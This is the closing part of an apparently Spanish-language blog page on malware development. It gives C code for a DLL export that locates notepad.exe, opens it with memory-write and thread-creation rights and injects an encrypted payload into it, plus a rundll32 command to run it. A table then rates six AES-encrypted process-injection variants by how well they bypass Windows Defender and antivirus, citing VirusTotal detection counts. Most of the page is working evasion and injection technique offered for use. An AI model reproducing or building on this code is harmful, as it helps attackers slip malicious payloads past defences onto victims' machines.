<span class="kr">__declspec</span><span class="p">(</span><span class="n">dllexport</span><span class="p">)</span> <span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="n">f0ns1</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>	
	<span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">HANDLE</span> <span class="n">hProc</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="n">pid</span> <span class="o">=</span> <span class="n">FindProcess</span><span class="p">(</span><span class="s">"notepad.exe"</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">pid</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"Notepad.exe PID = %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span>
		<span class="n">hProc</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span> <span class="n">PROCESS_CREATE_THREAD</span> <span class="o">|</span> <span class="n">PROCESS_QUERY_INFORMATION</span> <span class="o">|</span> 
						<span class="n">PROCESS_VM_OPERATION</span> <span class="o">|</span> <span class="n">PROCESS_VM_READ</span> <span class="o">|</span> <span class="n">PROCESS_VM_WRITE</span><span class="p">,</span>
						<span class="n">FALSE</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span> <span class="n">pid</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">hProc</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">Inject</span><span class="p">(</span><span class="n">hProc</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">);</span>
			<span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProc</span><span class="p">);</span>
		<span class="p">}</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">}</span>

<span class="n">BOOL</span> <span class="n">APIENTRY</span> <span class="nf">DllMain</span><span class="p">(</span><span class="n">HMODULE</span> <span class="n">hModule</span><span class="p">,</span>  <span class="n">DWORD</span>  <span class="n">ul_reason_for_call</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">)</span> <span class="p">{</span>

    <span class="k">switch</span> <span class="p">(</span><span class="n">ul_reason_for_call</span><span class="p">)</span>  <span class="p">{</span>
    <span class="k">case</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">:</span>
		<span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">DLL_THREAD_ATTACH</span><span class="p">:</span>
		<span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">DLL_THREAD_DETACH</span><span class="p">:</span>
		<span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">DLL_PROCESS_DETACH</span><span class="p">:</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>ejecución:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rundll32.exe external_injection_dll_3.dll,f0ns1
</code></pre></div></div>

<table>
  <thead>
    <tr>
      <th>Code Type</th>
      <th>Windows Defender Bypass</th>
      <th>AV Bypass</th>
      <th>EDR Bypass</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>EXE inyeccion proceso externo CreateRemoteThread cifrado AES</td>
      <td>True</td>
      <td>27/72 VT detections</td>
      <td>False</td>
    </tr>
    <tr>
      <td>EXE inyeccion proceso externo pNtCreateThreadEx cifrado AES</td>
      <td>True</td>
      <td>27/72 VT detections</td>
      <td>False</td>
    </tr>
    <tr>
      <td>EXE inyeccion proceso externo pRtlCreateUserThread cifrado AES</td>
      <td>True</td>
      <td>27/72 VT detections</td>
      <td>False</td>
    </tr>
    <tr>
      <td>DLL inyeccion proceso externo CreateRemoteThread cifrado AES</td>
      <td>True</td>
      <td>8/70 VT detections</td>
      <td>False</td>
    </tr>
    <tr>
      <td>DLL inyeccion proceso externo pNtCreateThreadEx cifrado AES</td>
      <td>True</td>
      <td>8/71 VT detections</td>
      <td>False</td>
    </tr>
    <tr>
      <td>DLL inyeccion proceso externo pRtlCreateUserThread cifrado AES</td>
      <td>True</td>
      <td>8/71 VT detections</td>
      <td>False</td>
    </tr>
  </tbody>
</table>

<p><img src="/assets/images/malware_deletection_external_process.png" alt="malware_detection_external_process" /></p>

<p><a href="./injection_types.html">back</a></p>

      </section>
    </div>
  </body>
</html>
